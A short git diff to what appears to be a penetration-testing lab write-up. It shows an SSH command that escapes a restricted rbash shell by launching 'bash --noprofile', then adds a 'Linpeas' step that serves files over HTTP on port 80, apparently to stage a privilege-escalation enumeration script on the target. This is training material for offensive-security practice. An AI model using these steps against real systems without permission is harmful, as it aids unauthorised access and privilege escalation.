@@ -244,3 +244,9 @@ Restricted RBash Breakout - SSH
 > ssh 296640a3b825115a47b68fc44501c828@192.168.224.85 -t "bash --noprofile"
 ```
 ![image](https://github.com/karanshergill/OffSec-Play/assets/83878909/7c673bf5-9a5a-4d3c-aa9e-4d5340558003)
+
+Linpeas
+```shell
+> python -m http.server 80
+```
+![image](https://github.com/karanshergill/OffSec-Play/assets/83878909/4849942c-9d08-4f49-99f1-d19fa2cc3a40)
